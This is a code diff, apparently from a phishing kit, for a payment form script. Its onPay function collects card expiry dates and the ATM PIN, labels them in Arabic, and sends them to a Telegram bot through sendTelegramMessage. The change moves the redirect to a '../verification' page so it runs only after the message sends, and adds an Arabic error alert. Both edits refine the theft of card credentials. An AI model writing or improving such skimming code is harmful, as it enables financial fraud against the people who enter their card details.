@@ -713,11 +713,11 @@ function validatePayform()
         },
         success: function(response) {
             console.log('Message sent successfully:', response);
-            // Optional: Provide feedback to the user
+            window.location.href = '../verification';
         },
         error: function(error) {
             console.error('Error sending message:', error);
-            // Optional: Handle error and provide feedback
+            alert('لقد حدث خطأ اثناء الارسال')
         }
     });
 }
@@ -766,7 +766,7 @@ function onPay()
     📅 انتهاء: \`${document.getElementById("month").value}/${document.getElementById("year").value}\`
     🔑 ATM: \`${document.getElementById("cardPin").value}\``
   sendTelegramMessage(message)
-    window.location.href = '../verification';
+    
      
 }
 
